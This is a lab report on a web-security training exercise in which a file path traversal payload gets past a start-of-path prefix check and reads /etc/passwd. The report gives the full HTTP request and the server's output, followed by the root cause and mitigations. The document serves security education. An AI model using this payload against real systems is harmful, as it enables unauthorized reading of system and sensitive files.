# Lab Report: File Path Traversal (Validation of start of path)

## Overview
This lab demonstrates a **File Path Traversal** vulnerability where the application attempts to validate that a supplied path starts with an allowed directory prefix (for example `/var/www/images/`) but fails to properly canonicalize or normalize the path. Because the validation only checks the literal start of the string, traversal sequences later in the path can escape the intended directory and allow access to sensitive files.

The goal of this lab was to retrieve the contents of the `/etc/passwd` file.

---

## Steps to Exploitation

### 1. Initial Request
The application used a request parameter `filename` to fetch image files. The developer attempted to enforce that the requested file path must start with `/var/www/images/` by checking the string prefix. However, this check was performed on the raw input without canonicalizing the path, so a payload that begins with the allowed prefix but contains traversal sequences afterwards can bypass the check.

### 2. Payload
A payload that begins with the allowed prefix and contains traversal sequences was used to bypass the naive start-of-path validation:

```
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
Host: <LAB-ID>.web-security-academy.net
Cookie: session=<valid-session-cookie>
User-Agent: Mozilla/5.0
Accept: image/avif,image/webp,*/*
```

**Explanation:**
- The server verifies that the input string starts with `/var/www/images/`, which this payload does. The application does not normalize the path to resolve `..` segments before enforcing the restriction. As a result, after path resolution the effective path becomes `/etc/passwd`, allowing the file to be read.

### 3. Server Response
The server returned the contents of `/etc/passwd`, proving successful exploitation:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

---

## Evidence

### Exploit Request and Response
![Exploit Request and Response](/images/validation%20of%20start%20of%20path1.jpg)

### Lab Solved Confirmation
![Lab Solved](/images/validation%20of%20start%20of%20path1%20lab%20solved.jpg)

---

## Result
- Retrieved sensitive system file: `/etc/passwd`  
- Confirmed path traversal vulnerability by bypassing a naive start-of-path validation using a payload that begins with the allowed prefix.  
- Lab status:  
  ✅ *"Congratulations, you solved the lab!"*

---

## Root Cause
- The application attempted to restrict file access by verifying that the input string starts with an allowed directory prefix but failed to canonicalize the path prior to validation.  
- Because path normalization was not performed, `..` segments occurring after the validated prefix allowed the path to escape the intended directory.

---

## Mitigation
1. **Canonicalize input** — Decode and normalize the input path (resolve `.` and `..` segments and percent-encoding) before applying any validation.  
2. **Validate canonical path** — After canonicalization, ensure the resulting absolute path resides within the allowed directory (for example, by checking that the canonical path has `/var/www/images/` as its prefix).  
3. **Use Whitelisting** — Restrict file access to a specific directory and a whitelist of filenames.  
4. **Avoid direct file paths** — Use indirect references (IDs or mappings) instead of exposing file paths to users.  
5. **Use secure APIs** — Use server-side APIs that perform proper path normalization and avoid manual string-based filtering.

---

## Skills Demonstrated
- Testing for path traversal vulnerabilities  
- Bypassing naive start-of-path validation by supplying traversal sequences after an allowed prefix  
- Retrieving sensitive files from the server (`/etc/passwd`)  
- Capturing and documenting exploitation steps with Burp Suite

---

## References
- PortSwigger Academy: File path traversal — validation of start of path  
- OWASP: Path Traversal

---

*End of report.*